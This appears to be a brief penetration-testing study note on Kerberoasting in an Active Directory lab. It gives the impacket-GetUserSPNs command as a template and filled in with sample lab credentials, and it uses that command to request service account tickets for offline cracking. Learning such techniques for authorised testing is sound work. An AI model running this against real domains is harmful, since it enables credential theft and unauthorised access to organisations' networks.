-- -
Used for #kerberoasting. Use valid credentials to get service account tickets that we can then abuse to get further access into the domain. Need a valid domain #userpass that can authenticate to the domain. Not local admin. 
### Kerberoast
```bash
# can be GetUserSPNs.py, but for kali it's as below
impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <dc ip> -request
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.3.4 -request
```

^59b305
